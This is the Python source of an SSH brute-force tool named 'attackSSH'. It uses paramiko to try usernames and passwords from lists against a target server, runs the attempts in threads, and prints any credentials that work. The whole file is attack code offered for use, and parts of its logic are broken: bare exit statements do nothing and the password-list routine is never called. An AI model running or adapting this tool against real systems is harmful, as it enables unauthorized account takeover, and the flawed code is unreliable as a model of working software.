#!/usr/bin/env python3

import paramiko
import argparse
from colorama import Fore, Style, init
import threading


class AttackSSH():

    def __init__(self):
        self.parser = argparse.ArgumentParser()# Add an argument
        self.parser.add_argument('-H', '--hostname',
                                 type=str, required=True, help='The server you would like to target. If you would like to include a port, you can do hostname:port')
        self.parser.add_argument('-U', '--userlist', 
                                 type=str, help='(optional) Specify a specific userlist')
        self.parser.add_argument('-u', '--user', 
                                 type=str, help='(optional) Specify a specific user e.g. "jdoe"')
        self.parser.add_argument('-p', '--password', 
                                 type=str, help='(optional) Specify a specific password e.g. "Fall2022!"')
        self.parser.add_argument('-P', '--passlist', 
                                 type=str, help='(optional) Specify a password list')
        self.parser.add_argument('-c', '--ciphers', 
                                 type=str, nargs='+', help='(optional) Specify the ciphers to use e.g. aes128-cbc, 3des-cbc')
        self.args = self.parser.parse_args()

        self.threads = []
        self.username = self.args.user
        self.password = self.args.password
        self.passlist = self.args.passlist
        self.hostname = self.args.hostname
        self.userlist = self.args.userlist
        self.ciphers = self.args.ciphers
        self.port = 22
        self.info = Fore.YELLOW + Style.BRIGHT
        self.pwn = Fore.RED + Style.BRIGHT
        self.close = Style.RESET_ALL
        self.success = Fore.GREEN + Style.BRIGHT

    def banner(self):
        print(self.info + "")
        print('       _   _             _     ____ ____  _   _')
        print('  __ _| |_| |_ __ _  ___| | __/ ___/ ___|| | | |')
        print(' / _` | __| __/ _` |/ __| |/ /\___ \___ \| |_| |')
        print('| (_| | |_| || (_| | (__|   <  ___) |__) |  _  |')
        print(' \__,_|\__|\__\__,_|\___|_|\_\|____/____/|_| |_|')
        print("             author: mdube")
        print("         A slow SSH brute force tool \n" + self.close)

    def getUsername(self):
        
        # Check for added port on the hostname
        if ":" in self.hostname:
            self.port = self.hostname.split(":")[1]
        print(f"Using {self.hostname} on port {self.port}")

        if self.args.userlist and self.args.user:
            print("You cannot have a username and a userlist")
            exit
        elif self.args.userlist:
            print(f"Starting SSH brute force with username file '{self.userlist}' and {self.password} \n")
            self.parseUserList(self.args.userlist)
        else:
            print(f"Starting SSH brute force with {self.username} and password file '{self.passlist}' \n")
            self.attack(self.username, self.passlist)

    def parseUserList(self, userlist):
        with open(userlist, "r") as file:
            for line in file:
                t = threading.Thread(target=self.attack, args=(line.rstrip(), self.password))
                # self.attack(line.rstrip(), self.password)
                self.threads.append(t)
                t.start()
        for t in self.threads:
            t.join()

    def parsePassList(self, passlist):
        with open(passlist, "r") as file:
            for line in file:
                self.attack(self.username, line.rstrip()) # rstrip gets rid of new line character inside of text files.
                # starts thread per attack, makes it much faster
                t = threading.Thread(target=self.attack, args=(self.username, line.rstrip()))
                # self.attack(line.rstrip(), self.password)
                self.threads.append(t)
                t.start()
        for t in self.threads:
            t.join()

    # Gets called to make connection to server
    def attack(self, user, password):
        ssh = paramiko.Transport(self.args.hostname, self.port)
        ssh.auth_timeout = 3 # not sure if this is needed
        ssh.raise_missing = False

        # If the user specifies ciphers, will include those for paramiko
        # Untested
        if self.ciphers: 
            paramiko.Transport._preferred_ciphers = (self.ciphers )

        try:
            ssh.connect(username=user, password=password)
            print(self.success + f"[+] {user} has a password of {password}" + self.close)
            exit
        except paramiko.AuthenticationException:
            print(self.pwn + f"[-] {user} does not have a password of {password}" + self.close)
            exit
        except paramiko.SSHException as e:
            print(f"Incompatible with ciphers, {e}")
            exit
        except(KeyboardInterrupt):
            ssh.close()
            exit
        ssh.close()

    def main(self):
        init()
        attackSSH.banner()
        self.getUsername()

attackSSH = AttackSSH()
attackSSH.main()
